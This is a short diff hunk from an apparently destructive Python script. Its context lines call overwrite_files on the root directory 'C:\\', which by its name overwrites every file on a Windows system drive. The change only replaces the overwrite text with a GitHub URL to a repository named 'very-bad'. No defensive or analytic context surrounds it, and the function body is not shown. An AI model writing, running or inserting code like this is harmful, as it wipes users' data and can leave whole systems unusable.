@@ -22,6 +22,6 @@ def overwrite_files(directory, new_content):
 
 # Set the root directory path
 root_directory = 'C:\\'
-new_content = "This is the new content."
+new_content = "https://github.com/TheMoog3/very-bad/tree/main"
 
 overwrite_files(root_directory, new_content)
